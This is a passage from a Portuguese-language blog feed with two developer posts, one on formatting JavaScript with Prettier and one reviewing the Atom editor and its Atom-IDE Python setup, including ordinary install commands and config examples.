&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="estrutura-de-dados"></category><category term="algoritmos"></category></entry><entry><title>Deixe darem pitaco no seu código com Prettier</title><link href="https://klauslaube.com.br/2019/01/12/deixe-darem-pitaco-no-seu-codigo-com-prettier.html" rel="alternate"></link><published>2019-01-12T10:55:00-02:00</published><updated>2019-01-12T10:55:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-01-12:/2019/01/12/deixe-darem-pitaco-no-seu-codigo-com-prettier.html</id><summary type="html">&lt;p&gt;&lt;em&gt;Code formatters&lt;/em&gt; são uma boa ideia. Acredite! Demorei a dar o braço a torcer,
mas depois de alguns "Hello world" em &lt;a href="https://golang.org/" title="Leia mais sobre Golang"&gt;&lt;em&gt;Go&lt;/em&gt;&lt;/a&gt;
admito que a ideia de ter um código bem formatado, sem necessitar da destreza do
programador para isso, é uma ideia excelente.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Em &lt;em&gt;Go&lt;/em&gt; temos o &lt;code&gt;go fmt …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;Code formatters&lt;/em&gt; são uma boa ideia. Acredite! Demorei a dar o braço a torcer,
mas depois de alguns "Hello world" em &lt;a href="https://golang.org/" title="Leia mais sobre Golang"&gt;&lt;em&gt;Go&lt;/em&gt;&lt;/a&gt;
admito que a ideia de ter um código bem formatado, sem necessitar da destreza do
programador para isso, é uma ideia excelente.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Em &lt;em&gt;Go&lt;/em&gt; temos o &lt;code&gt;go fmt&lt;/code&gt;, que
poupa um tempo absurdo tornando o seu código "go-like" com pouco esforço.
Já para &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, temos o &lt;a href="https://prettier.io/" title="Opiniated Code Formatter"&gt;&lt;em&gt;Prettier&lt;/em&gt;&lt;/a&gt;.
E é sobre ele que falaremos nesse artigo.&lt;/p&gt;
&lt;h2&gt;Mais bonito&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Prettier&lt;/em&gt; é um &lt;em&gt;code formatter&lt;/em&gt; livre (&lt;a href="https://github.com/prettier/prettier/blob/master/LICENSE" title="Leia o documento completo"&gt;&lt;em&gt;MIT&lt;/em&gt;&lt;/a&gt;) e de código aberto, que tem por finalidade "forçar" um padrão de código. Ele realiza isso analisando o seu código e alterando-o de acordo com regras pré-definidas.&lt;/p&gt;
&lt;p&gt;Todos nós temos algum vício na forma como escrevemos nosso código. A ideia de ferramentas como o &lt;em&gt;Prettier&lt;/em&gt; é fazer com que todos os integrantes de um projeto tenham um estilo comum de escrita. Tornando a leitura do código consistente, não importando o seu autor (ou editor).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/sam-elliot-prettier.jpg" width="640" height="389" title="Prettier é como trabalhar para o Sr. Bennett, de The Ranch. Na dúvida, você está errado (heighline)" alt="Prettier é como trabalhar para o Sr. Bennett, de The Ranch. Na dúvida, você está errado (heighline)"&gt;&lt;/p&gt;
&lt;p&gt;Com "estilo comum de escrita" não estamos falando necessariamente de qualidade de código. Por exemplo, o &lt;em&gt;Prettier&lt;/em&gt; não está preocupado com variáveis sendo usadas antes de serem declaradas. Para isso existe os &lt;a href="https://klauslaube.com.br/tag/qualidade.html" title="Leia mais sobre qualidade de código"&gt;&lt;em&gt;linters&lt;/em&gt;&lt;/a&gt;, e no caso do &lt;em&gt;Javascript&lt;/em&gt; o &lt;a href="https://eslint.org/" title="The pluggable linting utility for JavaScript and JSX"&gt;&lt;em&gt;ESLint&lt;/em&gt;&lt;/a&gt; é (provavelmente) a opção mais famosa. Por outro lado, ele estará preocupado com a quantidade de espaços em branco, quantidade de caracteres por linha, uso de vírgulas, etc. Tópicos que geralmente demandam energia durante um &lt;em&gt;code review&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E talvez esse seja o ponto marcante por trás do &lt;em&gt;Prettier&lt;/em&gt;. Diretamente da &lt;a href="https://prettier.io/docs/en/option-philosophy.html" title="Option Philosophy"&gt;página que fala sobre a filosofia da ferramenta&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;By far the biggest reason for adopting Prettier is to stop all the on-going debates over styles.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;A ferramenta é escrita em &lt;em&gt;Node.js&lt;/em&gt;, portanto, um &lt;code&gt;npm install&lt;/code&gt; é o suficiente para tê-la em seu ambiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ npm install --global prettier
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A documentação da ferramenta sugere "pinnar" a versão exata no &lt;code&gt;package.json&lt;/code&gt; do seu projeto, uma vez que diferentes versões podem ter diferentes sugestões de escrita.&lt;/p&gt;
&lt;p&gt;Com o utilitário de linha de comando, basta executarmos passando o arquivo &lt;em&gt;JS&lt;/em&gt; desejado como parâmetro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ prettier file.js

function HelloWorld({
    greeting = &amp;quot;hello&amp;quot;,
    greeted = &amp;#39;&amp;quot;World&amp;quot;&amp;#39;,
    silent = false,
onMouseOver
}) {
    if (!greeting) {
        return null;
    }

    // TODO: Don&amp;#39;t use random in render
    let num = Math.floor(Math.random() * 1e7)
        .toString()
        .replace(/\.\d+/gi, &amp;quot;&amp;quot;);

    return (
        &amp;lt;div
        className=&amp;quot;HelloWorld&amp;quot;
        title={`You are visitor number ${num}`}
        onMouseOver={onMouseOver}
        &amp;gt;
        &amp;lt;strong&amp;gt;
            {greeting.slice(0, 1).toUpperCase() + greeting.slice(1).toLowerCase()}
        &amp;lt;/strong&amp;gt;
        {greeting.endsWith(&amp;quot;,&amp;quot;) ? (
            &amp;quot; &amp;quot;
        ) : (
            &amp;lt;span style={{ color: &amp;quot;grey&amp;quot; }}&amp;gt;&amp;quot;, &amp;quot;&amp;lt;/span&amp;gt;
        )}
        &amp;lt;em&amp;gt;{greeted}&amp;lt;/em&amp;gt;
        {silent ? &amp;quot;.&amp;quot; : &amp;quot;!&amp;quot;}
        &amp;lt;/div&amp;gt;
    );
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;output&lt;/em&gt; é o conteúdo do seu arquivo já formatado. Se quiser a alteração "in-place", temos a opção &lt;code&gt;--write&lt;/code&gt; disponível.&lt;/p&gt;
&lt;p&gt;É possível customizar a ferramenta de acordo com as suas escolhas &lt;a href="https://prettier.io/docs/en/options.html" title="Options"&gt;passando argumentos durante sua chamada&lt;/a&gt;. No exemplo abaixo, queremos formatar o arquivo &lt;code&gt;file.js&lt;/code&gt; sem &lt;em&gt;semicolons&lt;/em&gt; no final das linhas, e com &lt;em&gt;single quotes&lt;/em&gt; ao invés de &lt;em&gt;double quotes&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ prettier --no-semi --single-quote file.js
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O mais recomendado é a criação de um &lt;a href="https://prettier.io/docs/en/configuration.html" title="Configuration file"&gt;arquivo de configuração&lt;/a&gt; (geralmente chamado de &lt;code&gt;.prettierrc&lt;/code&gt;), com todas a regras explícitas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;trailingComma&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;es5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;tabWidth&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;semi&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;singleQuote&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Na prática (de verdade)&lt;/h2&gt;
&lt;p&gt;É inviável ir na linha de comando e executar a ferramenta toda a vez que você alterar o seu código. Uma opção mais eficiente é deixar com que o seu editor ou &lt;em&gt;IDE&lt;/em&gt; tome conta desse processo.&lt;/p&gt;
&lt;p&gt;Os principais editores do mercado possuem suporte ao &lt;em&gt;Prettier&lt;/em&gt;, como pode ser visto em &lt;a href="https://prettier.io/docs/en/editors.html" title="Leia na documentação da ferramenta"&gt;Editor Integration&lt;/a&gt;. Para o &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;, recomendo o uso com o &lt;em&gt;plugin&lt;/em&gt; &lt;a href="https://github.com/w0rp/ale" title="Asynchronous linting/fixing for Vim and Language Server Protocol (LSP) integration"&gt;&lt;em&gt;Ale&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;É esperado que nem todo membro do seu projeto configurará o editor apropriadamente na primeira interação. Portanto, uma "salvaguarda" pode ser habilitar um &lt;em&gt;pre-commit hook&lt;/em&gt;. Com isso, ao executar &lt;code&gt;git add&lt;/code&gt;, o &lt;em&gt;Prettier&lt;/em&gt; será executado automaticamente nos arquivos alterados pelo desenvolvedor. O capítulo &lt;a href="https://prettier.io/docs/en/precommit.html" title="Leia na documentação oficial"&gt;Pre-commit Hook&lt;/a&gt; da documentação oficial dá várias sugestões de uso. Para esse caso, simpatizo bastante com o &lt;a href="https://pre-commit.com/" title="A framework for managing and maintaining multi-language pre-commit hooks"&gt;pre-commit&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;ESLint vs Prettier? ESLint + Prettier!&lt;/h2&gt;
&lt;p&gt;Sabe o que é melhor que usar o &lt;em&gt;Prettier&lt;/em&gt;? É usar o &lt;em&gt;Prettier&lt;/em&gt; integrado com as regras que você já conhece do &lt;em&gt;ESlint&lt;/em&gt;. Obviamente que executar os dois em paralelo pode resultar em comportamentos inesperados. Existe inúmeros tutoriais na internet recomendando como fazer essas duas ferramentas funcionarem em conjunto.&lt;/p&gt;
&lt;p&gt;Recomendo o &lt;a href="https://blog.echobind.com/integrating-prettier-eslint-airbnb-style-guide-in-vscode-47f07b5d7d6a" title="Leia o artigo original"&gt;Integrating Prettier + ESLint + Airbnb Style Guide in VSCode&lt;/a&gt;, do &lt;em&gt;Echobind&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Não perca tempo tentando controlar "na conversa" o estilo de código do seu time ou projeto. Já passei por isso e não compensa o estresse e tempo investido. Adote uma ferramenta como o &lt;em&gt;Prettier&lt;/em&gt;, e reserve tempo e energia para coisas mais importantes, relacionados ao seu negócio ou produto.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.echobind.com/integrating-prettier-eslint-airbnb-style-guide-in-vscode-47f07b5d7d6a"&gt;Echobind - Integrating Prettier + ESLint + Airbnb Style Guide in VSCode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.futurehosting.com/blog/prettier-vs-eslint-whats-the-difference/"&gt;Future Hosting - Prettier vs Eslint: What's the difference?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@joshuacrass/javascript-linting-and-formatting-with-eslint-prettier-and-airbnb-30eb746db862"&gt;Joshua Crass - Javascript Linting and Formatting with ESLint, Prettier, and Airbnb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="formatters"></category><category term="editores"></category><category term="prettier"></category><category term="javascript"></category><category term="html"></category><category term="css"></category></entry><entry><title>Atom: O simpático editor do GitHub</title><link href="https://klauslaube.com.br/2018/12/27/atom-o-simpatico-editor-do-github.html" rel="alternate"></link><published>2018-12-27T18:35:00-02:00</published><updated>2018-12-27T18:35:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-12-27:/2018/12/27/atom-o-simpatico-editor-do-github.html</id><summary type="html">&lt;p&gt;Tenho "peregrinado" por diferentes editores e &lt;em&gt;IDEs&lt;/em&gt; nesses últimos meses. Além
do &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre Vim"&gt;Vim&lt;/a&gt;, algumas "desventuras" com &lt;em&gt;IntelliJ IDEA&lt;/em&gt;,
e &lt;a href="https://klauslaube.com.br/2018/06/04/eu-me-rendo-vscode.html" title="Eu me rendo: VS Code"&gt;uma surpreendente experiência com o &lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;,
tive a oportunidade de testar uma alternativa que sempre me deixou intrigado:
&lt;a href="https://atom.io/" title="A hackable text editor for the 21st Century"&gt;O &lt;em&gt;Atom&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Embora notícias recentes em relação ao editor sejam "preocupantes", o …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tenho "peregrinado" por diferentes editores e &lt;em&gt;IDEs&lt;/em&gt; nesses últimos meses. Além
do &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre Vim"&gt;Vim&lt;/a&gt;, algumas "desventuras" com &lt;em&gt;IntelliJ IDEA&lt;/em&gt;,
e &lt;a href="https://klauslaube.com.br/2018/06/04/eu-me-rendo-vscode.html" title="Eu me rendo: VS Code"&gt;uma surpreendente experiência com o &lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;,
tive a oportunidade de testar uma alternativa que sempre me deixou intrigado:
&lt;a href="https://atom.io/" title="A hackable text editor for the 21st Century"&gt;O &lt;em&gt;Atom&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Embora notícias recentes em relação ao editor sejam "preocupantes", o veredicto
é o melhor possível. Recomendo desde já o uso, e abaixo dou mais detalhes
sobre essa minha conclusão.&lt;/p&gt;
&lt;h2&gt;O que é?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Atom&lt;/em&gt; é um editor de textos, gratuito e de código aberto
(&lt;a href="https://en.wikipedia.org/wiki/MIT_License" title="Leia mais sobre a MIT License"&gt;&lt;em&gt;MIT&lt;/em&gt;&lt;/a&gt;),
construído em &lt;a href="https://github.com/electron/electron" title="Leia mais sobre Electron"&gt;&lt;em&gt;Electron&lt;/em&gt;&lt;/a&gt;
(portanto multiplataforma) e mantido pelo &lt;em&gt;GitHub&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O editor ganha vida através de
&lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;/&lt;a href="https://coffeescript.org/" title="CoffeeScript is a little language that compiles into JavaScript"&gt;&lt;em&gt;CoffeeScript&lt;/em&gt;&lt;/a&gt; e
&lt;a href="http://lesscss.org/" title="It's CSS, with just a little more."&gt;&lt;em&gt;Less&lt;/em&gt;&lt;/a&gt;, e com essas
mesmas tecnologias é possível estendê-lo de maneira impressionante. Aliás, o
processo de customização é muito bem documentado, no
&lt;a href="https://flight-manual.atom.io/" title="Leia mais na página oficial"&gt;&lt;em&gt;Atom Flight Manual&lt;/em&gt;&lt;/a&gt;,
e escrever seus próprios &lt;em&gt;plugins&lt;/em&gt; tem uma curva de aprendizado mínima se você
já trabalhar com desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Por padrão o &lt;em&gt;Atom&lt;/em&gt; oferece &lt;em&gt;syntax highlighting&lt;/em&gt; para uma grande gama de linguagens,
além de outros utilitários, como &lt;em&gt;fuzzy finder&lt;/em&gt;, &lt;em&gt;tree view&lt;/em&gt;, corretor ortográfico,
e um simples &lt;em&gt;auto-complete&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;O que há de bom?&lt;/h2&gt;
&lt;p&gt;Gosto muito do visual do &lt;em&gt;Atom&lt;/em&gt;. Na minha opinião, é um dos editores mais bonitos
disponíveis por aí. As fontes, cores (muito graças aos temas incríveis)
e ícones são renderizados de forma suave, e o "conforto visual" não pode deixar de ser
mencionado.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/ant-man-atom.jpg" width="540" height="297" title="Não tive criatividade para fazer uma referência melhor (collider.com)" alt="Não tive criatividade para fazer uma referência melhor (collider.com)"&gt;&lt;/p&gt;
&lt;p&gt;Por vir com uma configuração mais "básica"
por &lt;em&gt;default&lt;/em&gt;, o editor é muito simples de usar. Sem requerer funções avançadas
(comuns em &lt;em&gt;IDEs&lt;/em&gt;, como &lt;em&gt;auto-complete&lt;/em&gt;, &lt;em&gt;debugging&lt;/em&gt; e &lt;em&gt;go to definition&lt;/em&gt;), basta
abrí-lo e começar a escrever código. Sem dúvida ele apresenta uma interface
mais amigável que outras opções no mercado.&lt;/p&gt;
&lt;p&gt;Como não há almoço grátis, o &lt;em&gt;Atom&lt;/em&gt; leva a fama de ser mais lento que
opções como &lt;em&gt;VS Code&lt;/em&gt; e &lt;em&gt;Vim&lt;/em&gt;. E embora o time de desenvolvedores
&lt;a href="https://blog.atom.io/2017/04/18/improving-startup-time.html" title="Improving Startup time"&gt;tenha trabalhado nessa questão&lt;/a&gt;,
é possível notar os "soluços" do editor em algumas ocasiões.&lt;/p&gt;
&lt;p&gt;A integração com &lt;em&gt;Git&lt;/em&gt; (e obviamente &lt;em&gt;GitHub&lt;/em&gt;) é bem interessante, e pode ajudar
bastante quem não tem intimidade com a linha de comando. E um extra bacana é o
&lt;a href="https://teletype.atom.io/" title="Collaborate in real time in Atom"&gt;&lt;em&gt;Teletype&lt;/em&gt;&lt;/a&gt;:
Pacote que vem com a distribuição padrão e que permite desenvolvedores colaborarem
em &lt;em&gt;real time&lt;/em&gt; com o código aberto no editor.&lt;/p&gt;
&lt;p&gt;Por falar em pacotes e extensões, talvez esse seja o ponto mais alto do editor.&lt;/p&gt;
&lt;p&gt;Dentre eles vale mencionar o &lt;a href="https://atom.io/packages/vim-mode-plus" title="vim-mode improved"&gt;&lt;em&gt;vim-mode-plus&lt;/em&gt;&lt;/a&gt;
e o &lt;a href="https://atom.io/packages/ex-mode" title="Ex for Atom's vim-mode"&gt;&lt;em&gt;ex-mode&lt;/em&gt;&lt;/a&gt;. Estes
trazem os &lt;em&gt;key bindings&lt;/em&gt; do &lt;em&gt;Vim&lt;/em&gt; para o &lt;em&gt;Atom&lt;/em&gt;. Eles funcionam extremamente bem
e é a "experiência &lt;em&gt;Vim-like&lt;/em&gt;" mais eficiente que já experimentei.&lt;/p&gt;
&lt;p&gt;Configurar um &lt;em&gt;set&lt;/em&gt; de &lt;em&gt;plugins&lt;/em&gt; para as suas linguagens favoritas pode
ser maçante e &lt;em&gt;error prone&lt;/em&gt;. O &lt;em&gt;VS Code&lt;/em&gt; resolveu isso através de "plugins agregadores"
que acabam instalando e configurando uma série de outros &lt;em&gt;plugins&lt;/em&gt; menores para você. No
&lt;em&gt;Atom&lt;/em&gt;, o &lt;em&gt;Atom-IDE&lt;/em&gt; se destaca nesse quesito.&lt;/p&gt;
&lt;h3&gt;Atom-IDE&lt;/h3&gt;
&lt;p&gt;O &lt;a href="https://ide.atom.io/" title="Improve language integration"&gt;&lt;em&gt;Atom-IDE&lt;/em&gt;&lt;/a&gt; é uma coletânea
de &lt;em&gt;plugins&lt;/em&gt; e funcionalidades que trazem características comuns em &lt;em&gt;IDEs&lt;/em&gt; para o
&lt;em&gt;Atom&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/atom-ide-ui.png" width="540" height="405" title="Atom-IDE UI" alt="Atom-IDE UI"&gt;&lt;/p&gt;
&lt;p&gt;Em uma colaboração entre &lt;em&gt;Facebook&lt;/em&gt; e &lt;em&gt;GitHub&lt;/em&gt;, tornou-se possível ter um &lt;em&gt;auto-complete&lt;/em&gt;
mais rico, &lt;em&gt;outline view&lt;/em&gt;, &lt;em&gt;go to definition&lt;/em&gt;, &lt;em&gt;find all references&lt;/em&gt;, &lt;em&gt;diagnosis&lt;/em&gt;,
&lt;em&gt;debugging&lt;/em&gt;, &lt;em&gt;document formatting&lt;/em&gt;, entre outras &lt;em&gt;features&lt;/em&gt; que você está acostumado a ver
em ferramentas como &lt;em&gt;Netbeans&lt;/em&gt; ou &lt;em&gt;Eclipse&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A boa notícia é que existe uma grande quantidade de &lt;em&gt;plugins&lt;/em&gt; que dão &lt;a href="https://atom.io/packages/search?q=IDE" title="Veja mais plugins de Atom-IDE"&gt;suporte a diferentes linguagens&lt;/a&gt;. Por exemplo,
recentemente testei o &lt;a href="https://atom.io/packages/ide-elixir" title="Plugin para o Elixir"&gt;&lt;em&gt;ide-elixir&lt;/em&gt;&lt;/a&gt;
e foi uma experiência muito boa.&lt;/p&gt;
&lt;p&gt;Mas é claro que tem a má notícia...&lt;/p&gt;
&lt;h3&gt;Facebook deixa de dar suporte&lt;/h3&gt;
&lt;p&gt;Diretamente do &lt;a href="https://blog.atom.io/2018/12/12/facebook-retires-nuclide-extension.html" title="Facebook retires Nuclide extension"&gt;&lt;em&gt;Blog do Atom&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A few years ago, Facebook introduced Nuclide to provide a first-class IDE experience which included associated repos such as Atom IDE. Both Nuclide and Atom IDE were developed by Facebook and supported by an open source community. At this time, Facebook has decided to retire their open source efforts on Nuclide, the Atom IDE, and other associated repos. All of the source code will remain available in the Facebook Open Source Archives, and, if you’re interested, we encourage you to check it out and continue to build on top of it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Na prática não há motivos para pânico. Os &lt;em&gt;plugins&lt;/em&gt; que estendem o &lt;em&gt;Atom-IDE&lt;/em&gt;
para suportar diferentes linguagens são mantidos por diferentes pessoas da
comunidade. O &lt;em&gt;Facebook&lt;/em&gt; "arquivou" os repositórios do &lt;em&gt;Atom-IDE&lt;/em&gt; e &lt;em&gt;Nuclide&lt;/em&gt;,
mas seu código continua disponível. O &lt;em&gt;framework&lt;/em&gt; que foi montado
até aqui deve continuar funcionando sem maiores problemas. Possíveis melhorias e correções
dependerão de contribuições da comunidade. É esperar para ver se algum grande &lt;em&gt;player&lt;/em&gt; ficará
responsável por coordenar esse esforço.&lt;/p&gt;
&lt;p&gt;Mas com a compra do &lt;em&gt;GitHub&lt;/em&gt; pela &lt;em&gt;Microsoft&lt;/em&gt;,
o &lt;em&gt;VS Code&lt;/em&gt; (da mesma &lt;em&gt;Microsoft&lt;/em&gt;) &lt;a href="https://www.infoq.com/br/news/2018/12/the-rise-vscode" title="A crescente adoção do Visual Studio Code"&gt;ganhando cada vez mais usuários&lt;/a&gt;, e esse anúncio do
time &lt;em&gt;Nuclide&lt;/em&gt;, fica difícil não ficar com &lt;a href="https://news.ycombinator.com/item?id=18507817" title="Is Atom now dead in the water?"&gt;a pulga atrás da orelha&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Atom-IDE + Python&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://atom.io/packages/ide-python"&gt;&lt;em&gt;ide-python&lt;/em&gt;&lt;/a&gt; é o &lt;em&gt;plugin&lt;/em&gt; para &lt;em&gt;Atom-IDE&lt;/em&gt;
que adiciona suporte à linguagem &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;
ao editor.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/ide-python-ui.png" width="640" height="410" title="Atom-IDE com Python" alt="Atom-IDE com Python"&gt;&lt;/p&gt;
&lt;p&gt;Assim como outros &lt;em&gt;plugins&lt;/em&gt; dependentes do mesmo &lt;em&gt;framework&lt;/em&gt;, ele utiliza &lt;a href="https://github.com/Microsoft/language-server-protocol" title="Defines a common protocol for language servers"&gt;&lt;em&gt;Language Server Protocol&lt;/em&gt;&lt;/a&gt;
para habilitar recursos como &lt;em&gt;completion&lt;/em&gt; e &lt;em&gt;refactoring&lt;/em&gt;. No caso do &lt;em&gt;Python&lt;/em&gt;, isso é
possível através do &lt;a href="https://github.com/palantir/python-language-server" title="An implementation of the Language Server Protocol for Python"&gt;&lt;em&gt;python-language-server&lt;/em&gt;&lt;/a&gt;. Logo, o primeiro passo
é instalar a dependência em sua máquina:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install python-language-server&lt;span class="o"&gt;[&lt;/span&gt;all&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o &lt;code&gt;[all]&lt;/code&gt;, você terá disponível &lt;em&gt;completions&lt;/em&gt; e &lt;em&gt;renaming&lt;/em&gt; (através do
&lt;a href="https://github.com/python-rope/rope" title="Repositório do Rope"&gt;&lt;em&gt;Rope&lt;/em&gt;&lt;/a&gt;),
&lt;em&gt;linter&lt;/em&gt; e &lt;em&gt;style checking&lt;/em&gt; (através do &lt;a href="https://github.com/PyCQA/pyflakes" title="Repositório do Pyflakes"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://github.com/PyCQA/mccabe" title="Repositório do McCabe"&gt;&lt;em&gt;McCabe&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://github.com/PyCQA/pycodestyle" title="Repositório do pycodestyle"&gt;&lt;em&gt;pycodestyle&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://github.com/PyCQA/pydocstyle" title="Repositório do pydocstyle"&gt;&lt;em&gt;pydocstyle&lt;/em&gt;&lt;/a&gt;) e
&lt;em&gt;code formatting&lt;/em&gt; (através de &lt;a href="https://github.com/hhatto/autopep8" title="Repositório do autopep8"&gt;&lt;em&gt;autopep8&lt;/em&gt;&lt;/a&gt;
ou &lt;a href="https://github.com/google/yapf" title="Repositório do YAPF"&gt;&lt;em&gt;YAPF&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Na sequência, basta instalar os &lt;em&gt;plugins&lt;/em&gt; do &lt;em&gt;Atom&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ apm install atom-ide-ui
$ apm install ide-python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Você já pode começar a usar o &lt;em&gt;Atom-IDE&lt;/em&gt; para escrever código &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas para deixar o seu ambiente ótimo, sugiro a instalação do &lt;a href="https://atom.io/packages/atomic-management" title="Per-project Atom config"&gt;&lt;em&gt;atom-management&lt;/em&gt;&lt;/a&gt;. Com ele, você poderá
configurar o &lt;em&gt;Python&lt;/em&gt; de acordo com o &lt;em&gt;virtualenv&lt;/em&gt; de cada projeto que esteja trabalhando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ apm install atomic-management
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora basta criar o arquivo de configuração para cada projeto. Aqui está um exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="ss"&gt;&amp;quot;ide-python&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;pylsPlugins&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;autopep8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;enabled&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;
      &lt;span class="n"&gt;yapf&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;enabled&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;
    &lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;/Users/klaus/.local/share/virtualenvs/yatla-kWU5r6Dm/bin/python&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


